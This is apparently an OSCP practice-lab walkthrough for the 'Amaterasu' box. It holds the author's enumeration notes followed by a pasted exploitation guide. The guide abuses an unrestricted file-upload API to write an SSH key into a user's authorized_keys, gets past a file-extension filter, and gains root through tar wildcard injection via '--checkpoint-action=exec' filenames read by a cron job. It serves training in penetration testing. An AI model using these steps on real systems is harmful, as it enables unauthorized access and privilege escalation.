#Enumeration

Target: 192.168.177.249

  

##Nmap

I forgot that -A does all the scans I need to switching to that for boxes

  

kali  🏡  OSCP  Amaterasu                                                                                                

 →  nmap -p- -A --open -T4 192.168.177.249 -oN amaterasu_nmap.txt                                                    15:38:26

Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 15:38 GMT

Nmap scan report for 192.168.177.249

Host is up (0.052s latency).

Not shown: 65510 filtered tcp ports (no-response), 21 closed tcp ports (conn-refused)

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT      STATE SERVICE VERSION

21/tcp    open  ftp     vsftpd 3.0.3

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

|_Can't get directory listing: TIMEOUT

| ftp-syst: 

|   STAT: 

| FTP server status:

|      Connected to 192.168.45.231

|      Logged in as ftp

|      TYPE: ASCII

|      No session bandwidth limit

|      Session timeout in seconds is 300

|      Control connection is plain text

|      Data connections will be plain text

|      At session startup, client count was 3

|      vsFTPd 3.0.3 - secure, fast, stable

|_End of status

25022/tcp open  ssh     OpenSSH 8.6 (protocol 2.0)

| ssh-hostkey: 

|   256 68c605e8dcf29a2a789beea1aef6381a (ECDSA)

|_  256 e989ccc21714f3bc6221064a5e7180ce (ED25519)

33414/tcp open  unknown

| fingerprint-strings: 

|   GetRequest, HTTPOptions: 

|     HTTP/1.1 404 NOT FOUND

|     Server: Werkzeug/2.2.3 Python/3.9.13

|     Date: Tue, 27 Jun 2023 15:41:04 GMT

|     Content-Type: text/html; charset=utf-8

|     Content-Length: 207

|     Connection: close

|     <!doctype html>

|     <html lang=en>

|     <title>404 Not Found</title>

|     <h1>Not Found</h1>

|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>

|   Help: 

|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"

|     "http://www.w3.org/TR/html4/strict.dtd">

|     <html>

|     <head>

|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">

|     <title>Error response</title>

|     </head>

|     <body>

|     <h1>Error response</h1>

|     <p>Error code: 400</p>

|     <p>Message: Bad request syntax ('HELP').</p>

|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>

|     </body>

|     </html>

|   RTSPRequest: 

|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"

|     "http://www.w3.org/TR/html4/strict.dtd">

|     <html>

|     <head>

|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">

|     <title>Error response</title>

|     </head>

|     <body>

|     <h1>Error response</h1>

|     <p>Error code: 400</p>

|     <p>Message: Bad request version ('RTSP/1.0').</p>

|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>

|     </body>

|_    </html>

40080/tcp open  http    Apache httpd 2.4.53 ((Fedora))

|_http-server-header: Apache/2.4.53 (Fedora)

| http-methods: 

|_  Potentially risky methods: TRACE

|_http-title: My test page

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

SF-Port33414-TCP:V=7.93%I=7%D=6/27%Time=649B0304%P=x86_64-pc-linux-gnu%r(G

SF:etRequest,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkzeug/

SF:2\.2\.3\x20Python/3\.9\.13\r\nDate:\x20Tue,\x2027\x20Jun\x202023\x2015:

SF:41:04\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent

SF:-Length:\x20207\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<htm

SF:l\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1

SF:>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20se

SF:rver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20c

SF:heck\x20your\x20spelling\x20and\x20try\x20again\.</p>\n")%r(HTTPOptions

SF:,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkzeug/2\.2\.3\x

SF:20Python/3\.9\.13\r\nDate:\x20Tue,\x2027\x20Jun\x202023\x2015:41:04\x20

SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\

SF:x20207\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang

SF:=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\n<p>The

SF:\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server\.\x2

SF:0If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20check\x20y

SF:our\x20spelling\x20and\x20try\x20again\.</p>\n")%r(RTSPRequest,1F4,"<!D

SF:OCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\

SF:x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\"

SF:>\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<met

SF:a\x20http-equiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\"

SF:>\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x

SF:20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20

SF:\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>

SF:Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\

SF:x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20

SF:\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQ

SF:UEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.<

SF:/p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(Help,1EF,"<!DOCTYPE\x20HTML

SF:\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x2

SF:0\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x2

SF:0\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equi

SF:v=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x2

SF:0\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20

SF:</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Er

SF:ror\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:

SF:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20requ

SF:est\x20syntax\x20\('HELP'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>E

SF:rror\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20

SF:request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x2

SF:0</body>\n</html>\n");

Service Info: OS: Unix

  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 231.54 seconds

  

21 - Will check this out manually

25022 - Alternative SSH (If I didn't run a -p- I wouldn't have found this)

33414 - Worth a curl to see what this is

40080 - seems to be a staging website 

  

##Searchsploit

21 - vsftpd 3.0.3

vsftpd 3.0.3 - Remote Denial of Service                                                                                                        | multiple/remote/49719.py

33414 - Nothing on Werkzeug/2.2.3

  

##FTP kali  🏡                                                                                                                                                                      

 →  ftp 192.168.177.249                                                                                                             

Connected to 192.168.177.249

220 (vsFTPd 3.0.3)

Name (192.168.177.249:kali): anonymous

331 Please specify the password.

Password: 

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp> ls

229 Entering Extended Passive Mode (|||18716|)

So meaning go to port 18716

ftp 192.168.177.249:18716                                                                                                                                           20:43:20

  

Connected to 192.168.177.249.

220 (vsFTPd 3.0.3)

331 Please specify the password.

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

200 Switching to Binary mode.

local: 18716 remote: 18716

229 Entering Extended Passive Mode (|||42089|)

ls

^C

receive aborted. Waiting for remote to finish abort.

221 Goodbye.

 ⚠   kali  🏡                                                                                                                                                                  

 →  ftp 192.168.177.249:42089                                                                                                                                           20:44:21

Connected to 192.168.177.249.

220 (vsFTPd 3.0.3)

331 Please specify the password.

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

200 Switching to Binary mode.

local: 42089 remote: 42089

229 Entering Extended Passive Mode (|||50268|)

^[[A^C

receive aborted. Waiting for remote to finish abort.

221 Goodbye.

 ⚠   kali  🏡                                                                                                                                                                  

 →  ftp 192.168.177.249:50268                                                                                                                                           20:44:36

Connected to 192.168.177.249.

220 (vsFTPd 3.0.3)

331 Please specify the password.

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

200 Switching to Binary mode.

local: 50268 remote: 50268

229 Entering Extended Passive Mode (|||63606|)

I keep doing this and it leads me to an easter egg hunt. Seems it's non ephemeral ports.

  
  

##Website

Seems to be a test site

[https://i.imgur.com/9QRZ6L9.png](https://i.imgur.com/9QRZ6L9.png)

Source code shows a list directory

    <ul> <!-- changed to list in the tutorial -->

      <li>technologists</li>

      <li>thinkers</li>

      <li>builders</li>

    </ul>

  

##dirbuster (using medium list)

Port 42089

 →  dirbuster                                                                                                                                                           20:22:37

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

Starting OWASP DirBuster 1.0-RC1

Starting dir/file list based brute forcing

Dir found: /images/ - 200

Dir found: / - 200

Dir found: /cgi-bin/ - 403

Dir found: /icons/ - 200

Dir found: /icons/small/ - 200

Dir found: /styles/ - 200

Nothing too fun. Possible directory traversal.

  

Port 33414

  

--- My Ukrainian internet died on me so I went for the walkthrough to close this out since I couldn't finish the directory scan to even find the API url --

  

Exploitation Guide for Amaterasu

Summary

  

An nmap scan reveals a REST API service on port 33414 which will allow us to list files on the server. After listing the files we discover a low privilege user "alfredo" and exploit a file upload vulnerability. We escalate privleges by using "Bash Gobbling", and by taking advantage of the "*" wildcard on the tar command.

Enumeration

  

We start off by running a standard nmap scan and a heavier scan which targets the ports discovered in the initial scan:

  

kali@kali:~$ sudo nmap -T4 -p- 192.168.56.101

Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 20:48 EDT

Nmap scan report for 192.168.56.101

Host is up (0.00027s latency).

Not shown: 65530 closed tcp ports (reset)

PORT      STATE SERVICE

21/tcp    open  ftp

5355/tcp  open  llmnr

25022/tcp open  unknown

33414/tcp open  unknown

40080/tcp open  unknown

  

kali@kali:~$ sudo nmap -T4 -sC -sV -p 21,25022,33414,40080 192.168.56.101

└─$ sudo nmap -T4 -sC -sV -p 21,5355,25022,33414,40080 192.168.56.101

Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 20:49 EDT

Stats: 0:02:19 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan

NSE Timing: About 99.56% done; ETC: 20:51 (0:00:00 remaining)

Stats: 0:02:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan

NSE Timing: About 99.56% done; ETC: 20:51 (0:00:00 remaining)

Stats: 0:02:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan

NSE Timing: About 99.56% done; ETC: 20:51 (0:00:00 remaining)

Nmap scan report for 192.168.56.101

Host is up (0.0061s latency).

  

PORT      STATE SERVICE VERSION

21/tcp    open  ftp     vsftpd 3.0.3

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

|_drwxr-xr-x    1 0        0              18 Apr 27 23:35 pub

| ftp-syst: 

|   STAT: 

| FTP server status:

|      Connected to 192.168.56.1

|      Logged in as ftp

|      TYPE: ASCII

|      No session bandwidth limit

|      Session timeout in seconds is 300

|      Control connection is plain text

|      Data connections will be plain text

|      At session startup, client count was 3

|      vsFTPd 3.0.3 - secure, fast, stable

|_End of status

5355/tcp  open  llmnr?

25022/tcp open  ssh     OpenSSH 8.6 (protocol 2.0)

| ssh-hostkey: 

|   256 ad:65:93:ab:92:f1:0b:32:de:6d:97:1f:09:0f:c3:ca (ECDSA)

|_  256 61:2c:5c:c6:c9:d8:77:37:c4:d4:dc:96:98:35:bf:cb (ED25519)

33414/tcp open  unknown

| fingerprint-strings: 

|   GetRequest, HTTPOptions: 

|     HTTP/1.1 404 NOT FOUND

|     Server: Werkzeug/2.1.1 Python/3.9.12

|     Date: Thu, 28 Apr 2022 00:49:09 GMT

|     Content-Type: text/html; charset=utf-8

|     Content-Length: 232

|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">

|     <title>404 Not Found</title>

|     <h1>Not Found</h1>

|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>

|   Help: 

|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"

|     "http://www.w3.org/TR/html4/strict.dtd">

|     <html>

|     <head>

|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">

|     <title>Error response</title>

|     </head>

|     <body>

|     <h1>Error response</h1>

|     <p>Error code: 400</p>

|     <p>Message: Bad request syntax ('HELP').</p>

|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>

|     </body>

|     </html>

|   RTSPRequest: 

|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"

|     "http://www.w3.org/TR/html4/strict.dtd">

|     <html>

|     <head>

|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">

|     <title>Error response</title>

|     </head>

|     <body>

|     <h1>Error response</h1>

|     <p>Error code: 400</p>

|     <p>Message: Bad request version ('RTSP/1.0').</p>

|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>

|     </body>

|_    </html>

40080/tcp open  http    Apache httpd 2.4.53 ((Fedora))

| http-methods: 

|_  Potentially risky methods: TRACE

|_http-title: My test page

|_http-server-header: Apache/2.4.53 (Fedora)

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

(...snip...)

  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 147.02 seconds

  

After enumerating port 33414 using dirb for content discovery, we find an interesting info directory.

  

kali@kali:~$ dirb http://192.168.56.101:33414/ /usr/share/wordlists/dirb/small.txt 

  

-----------------

DIRB v2.22    

By The Dark Raver

-----------------

  

START_TIME: Wed Apr 27 20:50:57 2022

URL_BASE: http://192.168.56.101:33414/

WORDLIST_FILES: /usr/share/wordlists/dirb/small.txt

  

---- Scanning URL: http://192.168.56.101:33414/ ----

  

+ http://192.168.56.101:33414/info (CODE:200|SIZE:99)                       

-----------------

END_TIME: Wed Apr 27 20:51:06 2022

DOWNLOADED: 959 - FOUND: 1

  

We can use curl to probe the directory for interesting information.

  

kali@kali:~$ curl http://192.168.56.101:33414/info

["Python File Server REST API v2.5","Author: Alfredo Moroder","GET /help = List of the commands"]

  

kali@kali:~$ curl http://192.168.56.101:33414/help

["GET /info = General Info","GET /help = This listing","GET /file-list = List of the files","POST /file-upload = Upload files"]

  

kali@kali:~$ curl http://192.168.56.101:33414/file-list?dir=/

["boot","dev","home","proc","run","sys","tmp","etc","root","var","usr","bin","lib","lib64","media","mnt","opt","sbin","srv",".autorelabel"]

  

kali@kali:~$ curl http://192.168.56.101:33414/file-upload

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">

<title>405 Method Not Allowed</title>

<h1>Method Not Allowed</h1>

<p>The method is not allowed for the requested URL.</p>

  

kali@kali:~$ curl -X POST http://192.168.56.101:33414/file-upload

{"message":"No file part in the request"}                                                                                                     

  

We have discovered an endpoint that is used for file uploads, and is currently set in the server's root directory. We also take note that the author is the user alfredo for future reference.

Exploitation

  

We begin by testing the file upload option:

  

kali@kali:~$ echo "Hacking?" > test.txt

  

The following request should set the "file" part of the POST request.

  

kali@kali:~$ curl -F file=@test.txt http://192.168.56.101:33414/file-upload

{"message":"No filename part in the request"}

  

Now we set the filename:

  

kali@kali:~$ curl -F filename="up.txt" -F file=@test.txt http://192.168.56.101:33414/file-upload

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">

<title>500 Internal Server Error</title>

<h1>Internal Server Error</h1>

<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>

  

We receive a "500" Internal Server Error. As mentioned earlier the server is currently pointing to root, so we likely do not have write permissions. Next, we attempt to set a directory in the request:

  

kali@kali:~$ curl -F filename="/tmp/up.txt" -F file=@test.txt http://192.168.56.101:33414/file-upload

{"message":"File successfully uploaded /tmp/up.txt"}

  

This will provide useful information about the directory, such as identifying if a folder/file exists, if it is writeable, and more. We will first test to confirm that the user "alfredo" exists:

  

kali@kali:~$ curl -F filename="/home/alfredo/up.txt" -F file=@test.txt http://192.168.56.101:33414/file-upload

{"message":"File successfully uploaded /home/alfredo/up.txt"}

  

kali@kali:~$ curl -F filename="/home/alfredo/.ssh/up.txt" -F file=@test.txt http://192.168.56.101:33414/file-upload

{"message":"File successfully uploaded /home/alfredo/.ssh/up.txt"}

  

We confirmed not only that the user "alfredo" exists, but that we can also write in his home directory where there is an .ssh folder.

Exploitation

  

Let's create an SSH key with ssh-keygen:

  

kali@kali:~$ ssh-keygen 

Generating public/private rsa key pair.

Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/id_alfredo

Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/kali/id_alfredo

Your public key has been saved in /home/kali/id_alfredo.pub

The key fingerprint is:

SHA256:2jZJco7aOWSCpO78cZ/VyO41fKnMUMbnBlUEc46KxLU kali@kali

The key's randomart image is:

+---[RSA 3072]----+

|           . oo+ |

|        . . . *  |

|         o E o . |

|  .     . o o    |

| o .  . S. * .   |

|. . . oO..* + .  |

|.  . =o *= = =   |

|..  oooo+.= =    |

|.o... o+.o +     |

+----[SHA256]-----+

  

Now we attempt to upload the file to the server:

  

kali@kali:~$ curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_alfredo.pub http://192.168.56.101:33414/file-upload

{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}

  

We encounter a filter, but since we can write the file with any name, the filter can easily be traversed.

  

kali@kali:~$ mv id_alfredo.pub id_alfredo.txt

kali@kali:~$ curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_alfredo.txt http://192.168.56.101:33414/file-upload

{"message":"File successfully uploaded /home/alfredo/.ssh/authorized_keys"}

  

Now we attempt to connect using the key we generated:

  

kali@kali:~$ ssh -p 25022 -i id_alfredo alfredo@192.168.56.101

The authenticity of host '[192.168.56.101]:25022 ([192.168.56.101]:25022)' can't be established.

ED25519 key fingerprint is SHA256:jDDyaRYIBM6N9EgPcrE3LAfFMJbKpmZiPRMimrzmMXU.

This key is not known by any other names

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '[192.168.56.101]:25022' (ED25519) to the list of known hosts.

Last login: Wed Apr 27 21:08:46 2022

  

[alfredo@amaterasu ~]$ cat local.txt 

  

Privilege Escalation

  

After thorough enumeration we identify a script that is running as root located in /etc/crontab:

  

[alfredo@amaterasu ~]$ cat /etc/crontab

(... snip ...)

  

5 * * * * root /usr/local/bin/backup-flask.sh

[alfredo@amaterasu ~]$ cat /usr/local/bin/backup-flask.sh 

#!/bin/sh

export PATH="/home/alfredo/restapi:$PATH"

cd /home/alfredo/restapi

tar czf /tmp/flask.tar.gz *

  

The * in the tar command will server as an entry point for a technique called BASH Gobbling.

  

We begin by creating a script to copy our key to the root user:

  

[alfredo@amaterasu ~]$ cd restapi

[alfredo@amaterasu restapi]$ echo '#!/bin/bash' >> getroot.sh

[alfredo@amaterasu restapi]$ echo 'cp /home/alfredo/.ssh/authorized_keys /root/.ssh/authorized_keys ' >> getroot.sh

[alfredo@amaterasu restapi]$ cat getroot.sh 

#!/bin/bash

cp /home/alfredo/.ssh/authorized_keys /root/.ssh/authorized_keys 

  

Now we can tamper with the backup process:

  

[alfredo@amaterasu restapi]$ touch ./--checkpoint=1 ./--checkpoint-action=exec=getroot.sh

  

We wait a few minutes for the cronjob to execute before trying to SSH in to the system as the ROOT user:

  

ssh -p 25022 -i id_alfredo root@192.168.56.101

Last login: Wed Apr 27 21:53:59 2022 from 192.168.56.1

[root@amaterasu ~]# cat proof.txt